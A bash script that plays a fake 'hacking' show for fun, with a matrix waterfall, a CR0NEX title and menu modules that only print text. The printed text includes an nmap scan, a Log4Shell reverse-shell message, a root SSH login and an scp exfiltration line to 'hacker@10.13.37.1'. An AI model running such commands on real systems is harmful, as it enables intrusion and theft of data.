#!/bin/bash
# Version 1.0 - All for fun, fully simulated

# Colors
GREEN="\033[0;32m"
CYAN="\033[0;36m"
YELLOW="\033[1;33m"
RED="\033[1;31m"
NC="\033[0m"

function ascii_waterfall() {
    clear
    echo -ne "\033[?25l"  # Hide cursor
    lines=$(tput lines)
    cols=$(tput cols)
    for ((i = 0; i < cols; i++)); do pos[i]=0; done

    duration=5
    end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ]; do
        for ((i = 0; i < cols; i++)); do
            if ((RANDOM % 5 == 0)); then
                row=${pos[i]}
                char=$(printf "%x" $((RANDOM % 16)))
                echo -ne "\033[${row};${i}H\033[1;32m$char\033[0m"
                pos[i]=$(( (pos[i] + 1) % lines ))
            fi
        done
        sleep 0.03
    done

    # Simulate fade-out column-by-column
    for ((fade = 0; fade < cols; fade += 4)); do
        for ((row = 0; row < lines; row++)); do
            echo -ne "\033[${row};${fade}H "
            echo -ne "\033[${row};$((fade+1))H "
            echo -ne "\033[${row};$((fade+2))H "
        done
        sleep 0.01
    done
    echo -ne "\033[?25h"  # Show cursor
    clear
}

function fade_in_cr0nex() {
    text="CR0NEX"
    echo -e "${GREEN}"
    for ((i = 1; i <= ${#text}; i++)); do
        clear
        echo -e "${GREEN}"
        sleep 0.1
        echo "${text:0:i}" | figlet -f big -c
        sleep 0.2
    done
    echo
    sleep 0.5
    echo -e "${CYAN}Breach the unreachable. Silence the signal.${NC}"
    sleep 2
}

function title_screen() {
    ascii_waterfall
    fade_in_cr0nex
}

# Fake typing function
function type_out() {
    local text="$1"
    for ((i = 0; i < ${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep 0.01
    done
    echo
}

# Menu
function main_menu() {
    PS3="Choose a hacking module: "
    options=("Reconnaissance" "Exploitation" "Access Gained" "Data Exfiltration" "Quit")
    select opt in "${options[@]}"; do
        case $opt in
            "Reconnaissance") recon ;;
            "Exploitation") exploit ;;
            "Access Gained") access ;;
            "Data Exfiltration") exfiltration ;;
            "Quit") echo -e "${RED}Exiting simulation...${NC}"; exit ;;
            *) echo "Invalid option";;
        esac
    done
}

function recon() {
    echo -e "${YELLOW}\n[RECON MODULE STARTED]${NC}\n"
    sleep 1

    type_out "${CYAN}Executing: nmap -sS -T4 -p- 192.168.56.101${NC}"
    sleep 1.5
    echo -e "Starting Nmap 7.93..."
    sleep 1
    echo "Nmap scan report for target.local (192.168.56.101)"
    echo "Host is up (0.0023s latency)."
    echo "Not shown: 65530 closed ports"
    echo "PORT     STATE SERVICE"
    echo "22/tcp   open  ssh"
    echo "80/tcp   open  http"
    echo "443/tcp  open  https"
    echo "3306/tcp open  mysql"
    sleep 2

    type_out "${CYAN}Executing: whois target.com${NC}"
    sleep 1
    echo "Domain Name: TARGET.COM"
    echo "Registrar: GoDaddy"
    echo "Name Server: NS1.TARGET.COM"
    echo "Org: Target Inc. (Example)"
    sleep 2

    type_out "${CYAN}Executing: dig +short target.com${NC}"
    sleep 1
    echo "192.168.56.101"
    echo -e "${GREEN}\nReconnaissance complete.\n${NC}"
}

function exploit() {
    echo -e "${YELLOW}\n[EXPLOIT MODULE STARTED]${NC}\n"
    sleep 1

    type_out "${CYAN}Loading CVE-2021-44228 Log4Shell Exploit Module${NC}"
    sleep 1
    echo "Payload configured: reverse shell -> 192.168.56.10:4444"
    sleep 1
    echo "Injecting payload into HTTP User-Agent header..."
    sleep 1
    echo -e "${GREEN}Exploit sent successfully.${NC}"
    sleep 1.5

    echo "Waiting for reverse shell connection..."
    sleep 2
    echo -e "${GREEN}Connection received from 192.168.56.101:54433${NC}"
    sleep 2
    echo -e "${GREEN}Shell spawned!${NC}"
}

function access() {
    echo -e "${YELLOW}\n[ACCESS MODULE STARTED]${NC}\n"
    sleep 1

    type_out "${CYAN}Attempting SSH login using cracked credentials...${NC}"
    sleep 1
    echo "ssh root@192.168.56.101"
    sleep 1.5
    echo "root@192.168.56.101's password: "
    sleep 1
    echo -e "${GREEN}Login successful.${NC}"
    sleep 1

    echo -e "\n${CYAN}Checking user privileges...${NC}"
    echo "id"
    echo "uid=0(root) gid=0(root) groups=0(root)"
    echo -e "${GREEN}Root access confirmed.${NC}"
}

function exfiltration() {
    echo -e "${YELLOW}\n[DATA EXFILTRATION MODULE STARTED]${NC}\n"
    sleep 1

    type_out "${CYAN}Compressing /var/www/html...${NC}"
    sleep 1.5
    echo "tar -czf www-data.tar.gz /var/www/html"
    echo "File created: www-data.tar.gz (3.2MB)"
    sleep 2

    type_out "${CYAN}Exfiltrating via scp to remote host...${NC}"
    echo "scp www-data.tar.gz hacker@10.13.37.1:/tmp"
    sleep 1.5
    echo "[====================] 100%  3.2MB  0.9MB/s  00:03"
    echo -e "${GREEN}Data exfiltration complete.${NC}"
    sleep 2
}

# Start
title_screen
main_menu
